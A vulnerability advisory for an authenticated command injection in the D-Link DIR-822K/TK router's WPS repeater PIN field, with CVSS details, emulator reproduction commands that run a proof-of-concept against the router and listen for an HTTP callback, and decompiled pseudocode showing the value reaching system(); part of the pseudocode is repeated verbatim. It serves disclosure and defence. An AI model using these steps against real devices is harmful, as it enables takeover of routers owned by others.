# DLINK-DIR-822K-TK-V007: WPS repeater PIN command injection (WPS disabled branch)

**Product:** D-Link DIR-822K/TK Telkom
**Firmware:** V1.00 Telkom, build 2025-06-24 (latest package in D-Link's directory; product is EOL)
**CWE:** CWE-78
**CVSS:** 7.2 (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H)
**Authentication:** Administrator authentication is required.
**Affected entry:** POST /boafrm/formWsc, parameter peerRptPin

An authenticated administrator can inject shell syntax and execute arbitrary operating-system commands with the Web service's privileges.

The peerRptPin parameter is interpolated into a shell command without complete shell escaping and reaches system().

## Shared emulation

Use the shared model environment: [dir-822k-tk emulator](../../../emu/dir-822k-tk/README.md).
Start it exactly as described there, then return to this case directory.

## Reproduction

1. Start the shared emulator and wait for its documented readiness check.
2. In a second terminal on the host, start this callback listener:

```sh
python3 -m http.server 8000 --bind 192.168.223.2
```

3. From this case directory, run:

```sh
python3 poc.py --target http://192.168.223.1 --username admin --password admin --callback 192.168.223.2:8000
```

Observe the callback or crash indicator described in the shared emulator README. The included `validation.log` records the internal self-test evidence.

## Root cause and attack path

The attack starts at authenticated `POST /boafrm/formWsc` with `setRptPIN=1` and `peerRptPin`, but follows the WPS-disabled configuration branch. The handler still uses the request value in a shell command: it can format it into the repeater PIN operation or write it through the `echo %s > /var/wps_peer_pin` path before calling `system()`.

The branch decision changes the command template, not the trust boundary. The value used in the selected template is not consistently constrained to digits or escaped for a shell. The PoC sets the disabled-state branch and observes its callback.

The relevant pseudocode is embedded below. It shows the request value being read, transformed or copied, and reaching the vulnerable sink.

```c
/* IDA pseudocode excerpt; addresses are from the analyzed firmware. */
  49840:       goto LABEL_84;
  49841:     }
  49842:     goto LABEL_82;
  49843:   }
  49844:   if ( *(unsigned char *)sub_40F4CC(a1, (int)"setPIN", (int)"") )
  49845:   {
  49846:     v36 = (const char *)sub_40F4CC(a1, (int)"peerPin", (int)"");
  49847:     v37 = v36;
  49848:     if ( *v36 )
  49849:     {
  49850:       sub_458CA0(byte_498914, v36, (int)&v47);
  49851:       apmib_get(270, v57);
  49852:       if ( !v57[0] )
  49853:       {
  49854:         memset(v44, 0, 20);
  49855:         v38 = 0;
  49856:         for ( j = 0; j < strlen(&v47); ++j )
  49857:         {
  49858:           v40 = *((unsigned char *)&v47 + j);
  49859:           if ( (unsigned char)(v40 - 48) < 0xAu )
  49860:             *((unsigned char *)v44 + v38++) = v40;
  49861:         }
  49862:         snprintf(v45, 200, "iwpriv %s set_mib pin=%s", byte_499040, v44);
  49863:         goto LABEL_99;
  49864:       }
  49865:       goto LABEL_97;
  49866:     }
  49867:   }
  49868:   if ( *(unsigned char *)sub_40F4CC(a1, (int)"setRptPIN", (int)"") )
  49869:   {
  49870:     v41 = (const char *)sub_40F4CC(a1, (int)"peerRptPin", (int)"");
  49871:     v37 = v41;
  49872:     if ( *v41 )
  49873:     {
  49874:       v47 = 0;
  49875:       v48 = 0;
  49876:       v49 = 0;
  49877:       v50 = 0;
  49878:       v51 = 0;
  49879:       sub_458CA0(byte_498914, v41, (int)&v47);
  49880:       apmib_get(270, v57);
  49881:       if ( !v57[0] )
  49882:       {
  49883:         snprintf(v45, 200, "iwpriv wlan%d-vxd set_mib pin=%s", wlan_idx, v37);
  49884: LABEL_99:
  49885:         system(v45);
  49886:         goto LABEL_100;
  49887:       }
  49888: LABEL_97:
  49889:       v57[0] = 0;
  49890:       apmib_set(270, v57);
  49891:       sub_44108C(4);
  49892:       snprintf(v45, 200, "echo %s > /var/wps_peer_pin", v37);
  49893:       system(v45);
  49894:       sub_442484((int)"bridge");
  49895: LABEL_100:
  49896:       sub_40FEEC((int)a1, (int)"<html><head>");
  49897:       sub_41000C((int)a1);
  49898:       sub_40FEEC(
  49899:         (int)a1,
  49900:         (int)"</head><body><table class=\"block\" border=\"0\"><h4 align=center>%s</h4>\n",

  49863:         goto LABEL_99;
  49864:       }
  49865:       goto LABEL_97;
  49866:     }
  49867:   }
  49868:   if ( *(unsigned char *)sub_40F4CC(a1, (int)"setRptPIN", (int)"") )
  49869:   {
  49870:     v41 = (const char *)sub_40F4CC(a1, (int)"peerRptPin", (int)"");
  49871:     v37 = v41;
  49872:     if ( *v41 )
  49873:     {
  49874:       v47 = 0;
  49875:       v48 = 0;
  49876:       v49 = 0;
  49877:       v50 = 0;
  49878:       v51 = 0;
  49879:       sub_458CA0(byte_498914, v41, (int)&v47);
  49880:       apmib_get(270, v57);
  49881:       if ( !v57[0] )
  49882:       {
  49883:         snprintf(v45, 200, "iwpriv wlan%d-vxd set_mib pin=%s", wlan_idx, v37);
  49884: LABEL_99:
  49885:         system(v45);
  49886:         goto LABEL_100;
  49887:       }
  49888: LABEL_97:
  49889:       v57[0] = 0;
  49890:       apmib_set(270, v57);
  49891:       sub_44108C(4);
  49892:       snprintf(v45, 200, "echo %s > /var/wps_peer_pin", v37);
  49893:       system(v45);
  49894:       sub_442484((int)"bridge");
  49895: LABEL_100:
  49896:       sub_40FEEC((int)a1, (int)"<html><head>");
  49897:       sub_41000C((int)a1);
  49898:       sub_40FEEC(
  49899:         (int)a1,
  49900:         (int)"</head><body><table class=\"block\" border=\"0\"><h4 align=center>%s</h4>\n",
  49901:         "Applied WPS PIN successfully!<br><br>You have to run Wi-Fi Protected Setup within 2 minutes.");
  49902: LABEL_101:
  49903:       if ( v5 )
  49904:         return sub_40FEEC(
  49905:                  (int)a1,
  49906:                  (int)"<form><input type=button value=\"  OK  \" OnClick=window.location.replace(\"%s\")></form></table></body></html>",
  49907:                  v5);
  49908:       else
  49909:         return sub_40FEEC(
  49910:                  (int)a1,
  49911:                  (int)"<form><input type=button value=\"  OK  \" OnClick=window.close()></form></table></body></html>");
  49912:     }
  49913:   }
  49914:   v42 = sub_40F4CC(a1, (int)"disableWPS", (int)"");
  49915:   v57[0] = strcmp(v42, "ON") == 0;
  49916:   snprintf(v46, 30, "wlan%d", wlan_idx);
  49917:   sub_428EF8(v46);
  49918:   apmib_set(270, v57);
  49919:   sub_44CBF8(wlan_idx, v57[0]);
  49920:   v43 = (unsigned char *)sub_40F4CC(a1, (int)"localPin", (int)"");
  49921:   if ( *v43 )
  49922:     apmib_set(273, v43);
  49923:   sub_44108C(4);
```

## Suggested remediation

Validate and constrain the affected input before invoking the privileged operation.

